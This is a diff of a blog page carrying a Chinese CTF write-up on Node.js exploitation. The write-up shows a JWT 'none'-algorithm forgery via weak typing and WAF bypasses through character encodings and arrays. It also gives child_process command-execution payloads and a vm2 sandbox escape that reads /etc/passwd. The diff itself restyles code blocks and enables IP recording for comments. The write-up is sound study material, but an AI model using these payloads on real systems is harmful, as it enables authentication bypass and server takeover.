@@ -466,29 +466,66 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <h2 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h2><p>Node.js使用的是javascript的语法。简单的说 Node.js 就是运行在服务端的 JavaScript。毫无疑问作为弱类型的javascript自然会把这种特性带到服务端,产生一些奇怪的效用。</p>
 <p>简单的弱类型的例子</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a =<span class="number">200</span>;</span><br><span class="line"><span class="keyword">var</span> b =<span class="string">"1"</span>;</span><br><span class="line"><span class="keyword">var</span> c= a + b;</span><br><span class="line"><span class="built_in">console</span>.log(c);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2001</span></span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">var a =200;
+var b =&quot;1&quot;;
+var c= a + b;
+console.log(c);
+
+//2001</code></pre>
 <p>字符串与数字经由一个二元运算符最后返回的是数字类型。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">name</span>:<span class="string">'jack'</span>&#125;</span><br><span class="line"><span class="keyword">if</span>(obj)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">var obj = {name:&#39;jack&#39;}
+if(obj){
+    console.log(1);
+}</code></pre>
 <p>对象可以转化为布尔值。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'hello'</span>;</span><br><span class="line">alert(<span class="keyword">typeof</span> a.fn());</span><br><span class="line">alert(a.fn());</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">String.prototype.fn = function(){return this};
+var a = &#39;hello&#39;;
+alert(typeof a.fn());
+alert(a.fn());</code></pre>
 <p>本该返回对象的函数a.fn()隐式的转换成了字符串“hello”显示.</p>
 <p>这样就可以借由虎符第一个easy_login的题目来探讨下nodejs的弱类型了。</p>
 <p>这道题不出意外应该是按照<a href="https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter" target="_blank" rel="noopener">https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter</a> 这个改的。原题跟此处的校验几乎一样。那我们来看看虎符这题的关键校验代码：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"><span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">
+const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
+console.log(sid)
+
+if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
+   throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
+}
+const secret = global.secrets[sid];
+const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});</code></pre>
 <p>去看原题就能学到姿势：由于sid是跟据第二个’.’的内容取出来的,如果稍微设计一下，比如令值为纯任意字母字符串，就能过那个if的判断并使secrets[sid]返回undefined.<br>这样配合上前面我们置为None的加密方式,即可在jwt.verify时成功解码。</p>
 <p>本题跟原题有一丁点的区别：<code>!(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>这段代码看似限制了我们只能传有效的数组键值即数字,但是数字字符串依旧有效</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">global.secrets=[<span class="string">'supersecretkeyyouwillneverknow'</span>,<span class="string">'2333333'</span>];</span><br><span class="line"><span class="keyword">const</span> sid=<span class="string">"00"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(sid);</span><br><span class="line"><span class="built_in">console</span>.log(global.secrets.length);</span><br><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"><span class="built_in">console</span>.log(secret);</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">global.secrets=[&#39;supersecretkeyyouwillneverknow&#39;,&#39;2333333&#39;];
+const sid=&quot;00&quot;;
+console.log(sid);
+console.log(global.secrets.length);
+if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
+    console.log(&quot;no&quot;);
+}
+const secret = global.secrets[sid];
+console.log(secret);</code></pre>
 <p>假设这是我们已经注册过2个用户的情况。现在看看执行结果<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>没有报错。说明正如我们所料,进行&gt;或者&gt;=这两个运算符后字符串sid被转换成了数值类型即 0(number) 0&lt;1 &amp;&amp; 0&gt;=0<br>同时下面的数组键值不存在,即secrets[“00”]不存在。<br>所以这题可以注册n个用户,(至少要有一个),然后传个小于长度的数字字符串就行。</p>
 <p>再简单一点的,直接传一个空字符串当然也是可以的。<br>空数组也是同样的道理。且数组如果传元素的话也会遵循跟上面字符串一样的转化规律<br>最后加密即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">'secretid'</span>: <span class="string">"00"</span>, <span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'password'</span>: <span class="string">'123'</span>&#125;</span><br><span class="line">print(jwt.encode(payload, <span class="string">''</span>, algorithm=<span class="literal">None</span>))</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import jwt
 
+payload = {&#39;secretid&#39;: &quot;00&quot;, &#39;username&#39;: &#39;admin&#39;, &#39;password&#39;: &#39;123&#39;}
+print(jwt.encode(payload, &#39;&#39;, algorithm=None))</code></pre>
 <p>值得一提的是,纯字母字符串与数字比较既不满足大于等于也不满足小于等于，这也是国际赛原题的小技巧。</p>
 <h2 id="使用编码-模板字符-数组等绕过waf"><a href="#使用编码-模板字符-数组等绕过waf" class="headerlink" title="使用编码\模板字符\数组等绕过waf"></a>使用编码\模板字符\数组等绕过waf</h2><p>Node.js在编码上也有许多可以绕过的技巧<br>常见的比如八进制,16进制,unicode</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"constructor"</span></span><br><span class="line"><span class="comment">//oct</span></span><br><span class="line"><span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span></span><br><span class="line"><span class="comment">//hex</span></span><br><span class="line"><span class="string">"\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"</span></span><br><span class="line"><span class="comment">//unicode</span></span><br><span class="line"><span class="string">"\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"</span></span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">&quot;constructor&quot;
+//oct
+&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;
+//hex
+&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;
+//unicode
+&quot;\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072&quot;
+</code></pre>
 <p>假如想调用命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(12345)&#39;)()</span><br><span class="line">[].constructor.constructor(&#39;alert(12345)&#39;)()</span><br><span class="line">Array.constructor(&#39;alert(12345)&#39;)()</span><br></pre></td></tr></table></figure>
-<p>//上面三种写法是等价的.之前公益赛NodeGame也提到过。<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<pre><code>[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(12345)&#39;)()
+[].constructor.constructor(&#39;alert(12345)&#39;)()
+Array.constructor(&#39;alert(12345)&#39;)()</code></pre><p>//上面三种写法是等价的.之前公益赛NodeGame也提到过。<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>但是要注意一点。这里其他进制以及unicode想要成功被解析成字符串还是得要单或双引号。否则无法成功执行。那么遇到过滤了单双引号的waf怎么办呢？</p>
 <p>这里再给出一种方法。比如这次虎符just_escape我使用的绕过waf的payload：<code>\u0065val(String.fromCharCode(116,114,121,123,10,32,32,32,32,32,32......))</code></p>
 <p>unicode的绕过不必多说后面字符串使用String.fromCharCode也是xss中经常用到的技巧了。<br>就是这个payload在icq打不通…buu可行。不然我差点怀疑方法构造有问题了…难受</p>
@@ -496,11 +533,21 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>简单来用就是用反引号代替双引号.所以上面说只有单双引号才能解析进制是错误的。<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>但是经实验后发现,只有八进制会在被反引号嵌套时出现报错。这点暂时没找到原因,我猜测可能跟八进制过于简便的写法有关吧。<br>(js语法中只要”\143”这种写法就默认为八进制,最大为”\377”)</p>
 <p>而模板字符串的写法允许我们进行字符拼接<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>当然针对虎符这道题还有数组绕过的一个姿势,因为只是接受参数，然后进行waf的辨别,使用数组自然也是可行的<br>构造payload上简单了许多。其实原理跟上面弱类型的trick一样，当数组分别为</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"process"</span>] <span class="comment">//waf</span></span><br><span class="line">[<span class="string">"global.process"</span>]  <span class="comment">// 绕过</span></span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">[&quot;process&quot;] //waf
+[&quot;global.process&quot;]  // 绕过</code></pre>
 <p>上面被waf挡住显然是因为数组的值直接提取出来与waf中过滤的每一个关键字比较。但是如果是完整的payload字符串显然不会被任何单个的waf关键字匹配到。</p>
 <p>下面这个paypal的RCE例子也可以参考下<br><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">https://artsploit.blogspot.com/2016/08/pprce2.html</a> </p>
 <p>关于数组绕过还有一个有趣的trick来自HackTM2020 Draw with us<br><a href="https://xz.aliyun.com/t/7177#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7177#toc-4</a><br>里面有一个点,需要获取n的值。但是n又被waf挡住了</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">"p"</span>, <span class="string">"n"</span>, <span class="string">"port"</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">function checkRights(arr) {
+  let blacklist = [&quot;p&quot;, &quot;n&quot;, &quot;port&quot;];
+  for (let i = 0; i &lt; arr.length; i++) {
+    const element = arr[i];
+    if (blacklist.includes(element)) {
+      return false;
+    }
+  }
+  return true;
+}</code></pre>
 <p>这里同样可以使用数组绕过。在js中,a[[“n”]]还是被理解成a.n 所以waf匹配不到,但是这样仍旧能获取n这个键的值。</p>
 <p><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>所以以上几种写法应该可以解决大多数waf了。</p>
@@ -508,16 +555,29 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <ul>
 <li>IIFE</li>
 </ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">(function(){ /* code */ }());
+
+(function(){ /* code */ })();</code></pre>
 <p>这是IIFE（立即调用函数表达式）的写法。javascript在遇到它之后将立即执行函数。</p>
 <p>在反序列化漏洞CVE-2017-5941 中有一处eval的拼接执行，就是用到了这个。因为eval后的语句是被括号包裹了的。其实说起来也简单。加个括号而已。然后命令在反序列化时直接触发。</p>
 <p>然后关于命令执行的几个常见payload,比如原型链中常用的payload</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br><span class="line">global.process.mainModule.constructor._load(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br><span class="line">global.process.mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">require(&#39;child_process&#39;).exec(&#39;calc&#39;)
+global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)
+global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;)</code></pre>
 <p>大体上就这几种执行命令的方式。其实简单说就是能获取到child_process这一步就行了。因为Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。<br>而直接require有时候是获取不到的,这点p牛也讲过了。</p>
 <h3 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h3><p>其实沙盒逃逸的题也不时第一次做。之前HITCON也有过这样的题,Confidence上也有沙盒的题。但是这次比赛还是拉胯了。虽然是环境的问题,但要是接触多的话换payload打应该是很轻松的吧。所以还是简单接触下</p>
 <p><a href="https://github.com/patriksimek/vm2/issues" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues</a><br>首先要找现成payload的话,直接上github上issue找就好了,有位dalao专业研究沙盒逃逸,基本上所有版本的payload都是他找的,直接issue里搜breakout即可。</p>
 <p>然后是原理。其实就是相当于给个沙盒环境。像process这样的危险代码基本都是undefined的。所以才有了通过<code>this.constructor.constructor(&#39;return this.process.env&#39;)()</code><br>bypass的payload出现。(跟pythonssti沙盒逃逸差不多不是吗)<br>vm2相比于vm环境限制更加严格。原先通过this获取constructor的方法不再行得通。目前主流的方法主要是通过trycatch语句构造。通过try语句中报错进入到catch块,假如catch块捕捉到的错误比如是由host扔出的,就能利用不加限制的host一步步获取属性到require进而命令执行。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.process.removeListener(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span> (host_exception) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'host exception: '</span> + host_exception.toString());</span><br><span class="line">        host_constructor = host_exception.constructor.constructor;</span><br><span class="line">        host_process = host_constructor(<span class="string">'return this'</span>)().process;</span><br><span class="line">  child_process = host_process.mainModule.require(<span class="string">"child_process"</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(child_process.execSync(<span class="string">"cat /etc/passwd"</span>).toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">try {
+        this.process.removeListener(); 
+    } 
+    catch (host_exception) {
+        console.log(&#39;host exception: &#39; + host_exception.toString());
+        host_constructor = host_exception.constructor.constructor;
+        host_process = host_constructor(&#39;return this&#39;)().process;
+  child_process = host_process.mainModule.require(&quot;child_process&quot;);
+  console.log(child_process.execSync(&quot;cat /etc/passwd&quot;).toString());
+    }</code></pre>
 <p>虎符这题则基本就是按hackim的babyjs改的。前端都几乎一样。只不过vm版本换成了3.8.3…所以搜下issue就行了。bypass用上面总结的方法都可以。</p>
 <p>关于沙盒逃逸的一些细节我也是不太懂。打算过段时间把国际赛上js沙盒逃逸的题补一下。目前的套路简单有：<br><code>Error().stack</code><br>使用此命令可以爆出stack strace.相当于是一个FUZZ手段了.爆出错误信息如vm.js或者vm2.js就可以去收集对应的payload了。</p>
 <p>日后再碰到沙盒逃逸的题也会放到文章里总结。希望自己能尽快上手Node.js吧。</p>
@@ -728,7 +788,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -740,9 +800,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -875,6 +935,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1088,7 +1150,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1144,6 +1206,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
